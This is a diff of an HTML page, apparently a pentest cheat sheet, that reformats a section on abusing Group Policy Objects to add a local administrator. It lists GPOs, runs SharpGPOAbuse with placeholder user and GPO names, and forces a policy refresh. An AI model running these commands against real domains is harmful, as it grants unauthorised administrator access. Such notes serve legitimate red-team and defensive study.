@@ -196,14 +196,20 @@
 
 <div class="content"><hr>
 <h3 id="abuse-1-add-local-admin">Abuse #1: Add local admin</h3>
-<p><a href="https://github.com/FSecureLABS/SharpGPOAbuse">SharpGPOAbuse</a></p>
 <h4 id="1-list-gpos-name">1. List GPOs Name</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Get-GPO</span> <span class="n">-All</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">DisplayName</span>
-</span></span></code></pre></div><h4 id="2-add-localadmin">2. Add localAdmin</h4>
+</span></span></code></pre></div></div>
+<h4 id="2-add-localadmin">2. Add localAdmin</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">.\</span><span class="n">SharpGPOAbuse</span><span class="p">.</span><span class="py">exe</span> <span class="p">-</span><span class="n">-AddLocalADmin</span> <span class="p">-</span><span class="n">-UserAccount</span> <span class="p">&lt;</span><span class="n">USER</span><span class="p">&gt;</span> <span class="p">-</span><span class="n">-GPOName</span> <span class="p">&lt;</span><span class="n">GPO_NAME</span><span class="p">&gt;</span>
-</span></span></code></pre></div><h4 id="3-force-reload">3. Force reload</h4>
+</span></span></code></pre></div></div>
+<h4 id="3-force-reload">3. Force reload</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">gpupdate</span> <span class="p">/</span><span class="n">force</span>
-</span></span></code></pre></div><br></div></div>
+</span></span></code></pre></div></div>
+<p><small><em>Ref: <a href="https://github.com/FSecureLABS/SharpGPOAbuse">SharpGPOAbuse</a></em></small></p>
+<br></div></div>
     
     <script src="/js/utils.js"></script>
     <footer>
